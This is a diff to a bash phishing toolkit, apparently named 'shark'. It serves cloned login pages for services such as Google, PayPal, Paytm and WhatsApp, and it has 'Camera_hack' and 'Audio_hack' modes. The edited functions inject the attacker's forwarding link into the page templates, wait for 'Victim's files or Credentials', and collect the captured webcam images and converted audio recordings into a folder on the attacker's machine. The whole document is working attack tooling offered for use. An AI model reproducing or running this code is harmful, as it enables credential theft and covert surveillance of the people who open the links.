@@ -117,12 +117,9 @@ function os () {
                 BIN="/usr/bin"
 	        phish="/usr/share/shark/phs"
 		logfile="$phish/"
-		user_id="$(logname)"
-		if [ "${user_id}" = "root" ]; then
-		         files="/root/Desktop"
-	        else
-		         files="/home/${user_id}/Desktop"
-	        fi
+		#if logname = root then
+		# user_id="$(logname)"
+		files="$HOME/Desktop"
 		shark="/usr/share/shark"
 		old_shark="/usr/bin/shark"
 		OS=DEBIAN
@@ -221,7 +218,7 @@ EOF
 }
 
 function purge_shark() {
-        os;printf "${red} Do you wish to delete camera and audio files too ? y/n : ";read ans && [ "$ans" != "${ans#[Yy]}" ];rm -rf ${files}/Audio\ And\ Camera\ Hack
+        os;printf "${red} Do you wish to delete camera and audio files too ? y/n : ";read ans && [ "$ans" != "${ans#[Yy]}" ];rm -rf ${files}/Audio-Cam-hack.shark
         rm -rf ${shark} ${old_shark}
 }
 
@@ -361,9 +358,8 @@ done
 
 # CHECK FILE
 file_check() {
-        [ ! -d "${files}/Audio\ And\ Camera\ Hack" ] && mkdir -p ${files}/Audio\ And\ Camera\ Hack
+        [ ! -d "${files}/Audio-Cam-hack.shark" ] && mkdir -p ${files}/Audio-Cam-hack.shark
 }
-
 #catch_ip camera
 catch_ip() {
         ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
@@ -723,8 +719,17 @@ echo ""
 msg "Waiting for Victim's files or Credentials..."
 }
 snt() {
-mv *.wav $files/Audio\ And\ Camera\ Hack &> /dev/null
-mv cam* $files/Audio\ And\ Camera\ Hack &> /devnull
+	if [[ "$option" == "31" ]]; then
+		echo -e "\e[1;92m[\e[0m\e[1;34m¤\e[0m\e[1;92m] Cam File Received!"
+		mv *.png ${files}/Audio-Cam-hack.shark/
+	fi
+	if [[ "$option" == "32" ]]; then
+		echo -e "\e[1;92m[\e[0m\e[1;34m¤\e[0m\e[1;92m] Audio File Received!"
+		ffmpeg -i *.wav -acodec mp3 *.mp3 &> /dev/null
+		mv *.mp3 ${files}/Audio-Cam-hack.shark/
+		echo ""
+		echo -e "\e[1;92m[\e[0m\e[1;34m+\e[0m\e[1;92m] Command To play audio:- play <path-to-file.mp3>\n"
+	fi
 }
 function ipinfo() {
 	echo
@@ -753,12 +758,13 @@ function ipinfo() {
 		       msg "Waiting for next Device, press CTRL + C for exit..."
 		fi
 		if [[ -e "Log.log" ]]; then
-				echo ""	
-				msg "$print"
-				echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Location $files"
-				echo ""
-				snt
-				msg "Waiting for next file, press CTRL + C for exit..."
+			rm Log.log
+			echo ""
+			snt
+			echo ""
+			echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] File Location : ${files}/Audio-Cam-hack.shark"
+			echo ""
+			msg "Waiting for next file, press CTRL + C for exit..."
 		fi
         done
 }
@@ -841,11 +847,9 @@ function camera_hack() {
 		cp -R * .drk/
 		cd .drk/ && rm -rf .drk/
                 prt
-		sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.
-php > index.php
+		sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.php > index.php
 		credentials
 			sleep 0.5
-			print=$(printf "\n${green}[${white}+${green}] Cam file received!\n")
 			ipinfo
 }
 
@@ -860,9 +864,10 @@ function audio_hack() {
         printf "\n${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://google.com) : " $default_redirect && read redirect_link
         redirect_link="${redirect_link:-${default_redirect}}";
         sed 's+forwarding_link+'$link'+g' template.php > index.php;sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
-        prt && credentials
+
+                #cat index2.html >> index.php
+	        prt && credentials
 	        sleep 0.5
-		print=$(printf "\n${green}[${white}+${green}] Voice file received!\n")
 		ipinfo
 }
 decne() {
@@ -1039,8 +1044,8 @@ function banner(){
         printf "\e[1;92m[\e[0m\e[1;37m06\e[0m\e[1;92m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;92m[\e[0m\e[1;37m17\e[0m\e[1;92m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;92m[\e[0m\e[1;37m28\e[0m\e[1;92m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
         printf "\e[1;92m[\e[0m\e[1;37m07\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;92m[\e[0m\e[1;37m18\e[0m\e[1;92m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;92m[\e[0m\e[1;37m29\e[0m\e[1;92m] \e[0m\e[1;48;5;236mAJIO\e[0m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m08\e[0m\e[1;92m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;92m[\e[0m\e[1;37m19\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;92m[\e[0m\e[1;37m30\e[0m\e[1;92m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n\n"   
-	printf "\e[1;92m[\e[0m\e[1;37m09\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;92m[\e[0m\e[1;37m20\e[0m\e[1;92m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m (For Pc)\n\n"
-	printf "\e[1;92m[\e[0m\e[1;37m10\e[0m\e[1;92m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;92m[\e[0m\e[1;37m21\e[0m\e[1;92m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m (For Pc)\n\n"
+	printf "\e[1;92m[\e[0m\e[1;37m09\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;92m[\e[0m\e[1;37m20\e[0m\e[1;92m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
+	printf "\e[1;92m[\e[0m\e[1;37m10\e[0m\e[1;92m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;92m[\e[0m\e[1;37m21\e[0m\e[1;92m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m11\e[0m\e[1;92m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;92m[\e[0m\e[1;37m22\e[0m\e[1;92m] \e[0m\e[1;34;103mFlipkart\e[0m          \e[1;92m[\e[0m\e[1;37m99\e[0m\e[1;92m] \e[0m\e[1;91;102mExit\e[0m\n\n"
         read -p $'\e[1;92mshark \e[1;97m>>\e[0m ' option
 }
